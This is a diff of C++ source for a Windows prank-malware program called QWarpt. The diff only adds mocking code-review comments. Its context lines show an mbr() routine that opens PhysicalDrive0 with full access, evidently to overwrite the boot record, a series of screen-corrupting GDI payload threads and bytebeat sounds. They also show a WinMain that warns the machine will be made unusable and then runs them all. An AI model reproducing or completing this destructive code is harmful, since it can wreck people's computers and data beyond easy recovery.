@@ -7,7 +7,8 @@
 #pragma comment(lib, "winmm.lib")
 
 void mbr() //fuckyouloris
-{    
+{  
+    // Sleepmod tutorial code  
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileW(
         L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
@@ -19,7 +20,7 @@ void mbr() //fuckyouloris
 
 DWORD WINAPI payload1(LPVOID lpParam) {
      HDC desk = GetDC(0);
-    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1); //this effect is kinda cool
+    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1); //this effect is kinda cool //your mom kinda cool
     while (1) {
         desk = GetDC(0);
         int rx = rand() % sw;
@@ -33,7 +34,7 @@ DWORD WINAPI payload1(LPVOID lpParam) {
     }
 }
 
-DWORD WINAPI payload2(LPVOID lpParam) { //halal payload
+DWORD WINAPI payload2(LPVOID lpParam) { //halal payload //haram gay effect
     HDC desk = GetDC(0);
 
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
@@ -52,18 +53,18 @@ DWORD WINAPI payload2(LPVOID lpParam) { //halal payload
 
 }
 DWORD WINAPI payload2dot1(LPVOID lpParam) { //idk fuck?
-    HDC desk = GetDC(0);
+    HDC desk = GetDC(0); //why 2
 
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
 
     while (1) {
 
-        desk = GetDC(0);
+        desk = GetDC(0); //why 2?
 
         int radius = 10, rx = rand() % sw, ry = rand() % sh, num = rand() % 5;
 
         for (int t = 0; t < sw + sh; ++t) {
-
+            // Very cool float, ngl LMFAOOOO
             int x = (int)(float)(radius + t * tan(t + radius * 3) + rx),
 
                 y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
@@ -98,10 +99,10 @@ DWORD WINAPI payload3(LPVOID lpParam) {
 }
 
 DWORD WINAPI payload4(LPVOID lpParam) {
-    HDC desk = GetDC(0);
+    HDC desk = GetDC(0); //kill me
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), rx;
     while (1) {
-        desk = GetDC(0);
+        desk = GetDC(0); // go die
         int a = rand() % sw, b = rand() % sh;
         BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCAND);
         BitBlt(desk, a, b, sw, sh, desk, a + cos(rand() % 21 - 10), b + cos(rand() % 21 - 10), SRCCOPY);
@@ -113,7 +114,7 @@ DWORD WINAPI payload4(LPVOID lpParam) {
 
 DWORD WINAPI payload5(LPVOID lpParam) { //this shit code is a mess
     while (1) {
-
+        //Skidded from Magnetar
         int width, height;
 
         HWND hwnd;
@@ -194,7 +195,7 @@ DWORD WINAPI payload5(LPVOID lpParam) { //this shit code is a mess
 }
 
 DWORD WINAPI payload6(LPVOID lpParam) { //first payload but with y pos and x pos
-    HDC desk = GetDC(0);
+    HDC desk = GetDC(0); //fuck
     int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
     while (1) {
         desk = GetDC(0);
@@ -211,6 +212,7 @@ DWORD WINAPI payload6(LPVOID lpParam) { //first payload but with y pos and x pos
 
 DWORD WINAPI payload7(LPVOID lpParam) { //most halal payload
     HDC desk = GetDC(0);
+    //Lmfao mf
     int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
     int x1 = GetSystemMetrics(0), y1 = GetSystemMetrics(1);
     int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
@@ -238,7 +240,7 @@ DWORD WINAPI payload7(LPVOID lpParam) { //most halal payload
 }
 
 DWORD WINAPI payload8(LPVOID lpParam) { //this payload was in solaris 2.0 fun fuck right?
-    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN);
+    int sx = GetSystemMetrics(SM_CXSCREEN), sy = GetSystemMetrics(SM_CYSCREEN); // why this using macro???, He using number before
 
     int c = 0;
 
@@ -315,7 +317,7 @@ DWORD WINAPI payload8(LPVOID lpParam) { //this payload was in solaris 2.0 fun fu
 }
 
 DWORD WINAPI payload9(LPVOID lpParam) { //Im fucking lazy
-    for (;;) 
+    for (;;) //why using for loop, previous while loop
 {
     HDC hdc = GetDC(0);
     int sw = GetSystemMetrics(SM_CXSCREEN);
@@ -336,7 +338,7 @@ DWORD WINAPI payload9(LPVOID lpParam) { //Im fucking lazy
 
 DWORD WINAPI payload9dot2(LPVOID lpParam) { //S E X P I X E L
      while (1) {
-
+        // Again from Magnetar
         HWND hwnd = GetDesktopWindow();
 
         HDC desktop = GetWindowDC(hwnd);
@@ -414,9 +416,10 @@ DWORD WINAPI payload10(LPVOID lpParam) {
 }
 
 DWORD WINAPI payload11(LPVOID lpParam) { //green screen kinda cool
+    // Skidded from Nikitpad tutorial
     int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
 
-    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // is he understand why should allocate memory?
 
     HDC hdc, hdcMem; HBITMAP hbm;
 
@@ -489,7 +492,7 @@ DWORD WINAPI payload13(LPVOID lpParam) { //im lazy, hep
 
         desk = GetDC(0);
 
-        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
+        SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255))); //epic gdi leak
 
         PatBlt(desk, 0, 0, sw, sh, PATINVERT);
 
@@ -536,7 +539,7 @@ DWORD WINAPI payload13dot3(LPVOID lpParam) {
 
                 y = (int)(float)(radius + t * cos(t + radius * 3) + ry);
 
-            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }
+            if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); } //what the fuck put float in Sleep
 
             if (rand() % 5 == 0) { DrawIcon(desk, x, y, LoadIcon(0, IDI_APPLICATION)); Sleep(0.99); }
 
@@ -636,7 +639,7 @@ VOID WINAPI sound1() { //baitbeat
     HWAVEOUT hWaveOut = 0;
     WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
     waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
-    char buffer[32000 * 30] = {};
+    char buffer[32000 * 30] = {}; // i like this
     for (DWORD t = 0; t < sizeof(buffer); ++t)
         buffer[t] = static_cast<char>(t >> 9) * (t >> 5) - t * cos(t >> 1); //cos
 
@@ -774,7 +777,7 @@ VOID WINAPI sound10() {
 }
 int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
 {
-
+   //Memz skid
     if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
 This malware will harm your computer and makes it unusable.\r\n\
 If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
@@ -794,6 +797,8 @@ STILL EXECUTE IT?", L"QWarpt", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
         }
         else
         {
+            //TerminateThread make me cancer, also the some code too.
+
             mbr();
             HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
             sound1();
@@ -886,7 +891,7 @@ STILL EXECUTE IT?", L"QWarpt", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
             Sleep(15000);
             TerminateThread(thread15, 0);
             CloseHandle(thread15);
-            Sleep(-1);
+            Sleep(-1); //epic gamer move
         }
     }
 }
